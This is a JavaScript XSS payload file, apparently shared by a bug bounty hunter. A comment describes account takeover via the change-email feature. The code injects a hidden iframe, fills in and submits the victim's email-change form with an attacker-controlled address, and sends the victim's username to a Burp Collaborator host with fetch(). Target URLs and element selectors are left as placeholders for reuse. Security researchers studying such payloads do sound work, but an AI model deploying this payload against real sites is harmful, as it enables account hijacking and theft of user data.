/*
This payload targets change email functionality seen in many web applications. The payload injects an iframe into the page and submits the form containing the updated email address. This will often be enough to go ahead and request a password reset allowing you to takeover the account. 

In this case, the username was also required. The payload sends the username to your burp collaborator address.

I used this on a bug bounty programme to successfully escalate a medium level XSS to critcal.
*/


document.addEventListener("DOMContentLoaded", function() {
    buildFrame();
})

function buildFrame() {
    let frame=document.createElement("iframe")
    frame.src="<TARGET-URL>/change-email"
    document.body.append(frame)
    setTimeout(function(){
        frame.contentDocument.getElementById("EmailAddress").value="<YOUR-EMAIL>"
        frame.contentDocument.getElementById("EmailAddressConfirm").value="<YOUR-EMAIL>"
        frame.contentDocument.querySelector("<TARGET-ELEMENTID/CLASS-FOR-BUTTON>").click()
    }, 2000)
    setTimeout(function(){
        let userName=frame.contentDocument.querySelector("<TARGET-ELEMENTID/CLASS-FOR-USERNAME>").textContent
        fetch('<BURP-COLLABORATOR>/?x='+userName)
    }, 5000)
}
